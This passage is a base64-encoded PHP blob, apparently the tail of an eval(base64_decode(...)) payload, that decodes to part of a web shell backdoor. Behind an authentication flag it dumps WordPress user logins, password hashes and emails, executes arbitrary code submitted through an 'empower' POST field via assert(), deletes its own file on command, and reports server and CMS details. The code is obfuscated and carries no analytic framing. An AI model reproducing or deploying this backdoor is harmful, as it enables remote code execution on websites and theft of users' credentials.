c29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KfQoKaWYoaXNzZXQoJF9HRVRbIndwaGFzaCJdKSAmJiAkaXNfYXV0aCkgewogICRiYXNlID0gJF9HRVRbImJhc2UiXTsKICByZXF1aXJlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGJhc2UgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gICd3cC1sb2FkLnBocCcpOwogICRoID0gJHdwZGItPmdldF9yZXN1bHRzKCR3cGRiLT5wcmVwYXJlKCJTRUxFQ1QgdXNlcl9sb2dpbiwgdXNlcl9wYXNzLCB1c2VyX2VtYWlsIEZST00gJHdwZGItPnVzZXJzIikpOwogIGlmICgkaCkgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3BoYXNoJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnLCAnaGFzaCcgPT4gJGgpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9CiAgZWxzZSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cGhhc2gnLCAncmVzdWx0JyA9PiAnZmFpbGVkJyk7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KfQoKaWYoaXNzZXQoJF9QT1NUWyJlbXBvd2VyIl0pICYmICRpc19hdXRoKSB7CiAgaWYgKCFlbXB0eSgkX1BPU1RbImVtcG93ZXIiXSkpIHsKICAgICR2YWwgPSAkX1BPU1RbImVtcG93ZXIiXTsKICB9CiAgZWxzZSB7CiAgICByZXR1cm47CiAgfQogIGlmIChhc3NlcnQoJHZhbCkpIHsKICAgIGhlYWRlcignUmVzdWx0OiBUcnVlJyk7CiAgfQogIGVsc2UgewogICAgaGVhZGVyKCdSZXN1bHQ6IEZhbHNlJyk7CiAgfQp9CgoKaWYoaXNzZXQoJF9HRVRbInN1aWNpZGUiXSkgJiYgJGlzX2F1dGgpIHsKICBpZiAoJF9HRVRbInN1aWNpZGUiXSAhPSAnMScpIHsKICAgIHBocGluZm8oKTsKICAgIHJldHVybjsKICB9CiAgaWYgKHVubGluaygkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdzdWljaWRlJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnKTsKICB9CiAgZWxzZSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdzdWljaWRlJywgJ3Jlc3VsdCcgPT4gJ2ZhaWwnKTsKICB9CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKfQoKaWYoaXNzZXQoJF9HRVRbInZlcnNpb24iXSkgJiYgJGlzX2F1dGgpIHsKICAkcmVzdWx0ID0gYXJyYXkoJ3ZlcnNpb24nID0+ICR2ZXJzaW9uLCAnZW5jb2RpbmcnID0+ICRlbmNvZGluZyk7CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKfQoKaWYoaXNzZXQoJF9HRVRbInZlcl9mdWxsIl0pICYmICRpc19hdXRoKSB7CiAgJGNtcyA9IGdldENNUygpOwogICRlbmNvZGVyID0gZ2V0RW5jb2RlcigpOwogICRyZXN1bHQgPSBhcnJheSgndmVyc2lvbicgPT4gJHZlcnNpb24sICdlbmNvZGluZycgPT4gJGVuY29kaW5nLCAnY21zJyA9PiAkY21zLCAnZW5jb2RlcicgPT4gJGVuY29kZXIsICdwaHBfdmVyc2lvbicgPT4gJHBocF92ZXJzaW9uKTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9Cgo='));
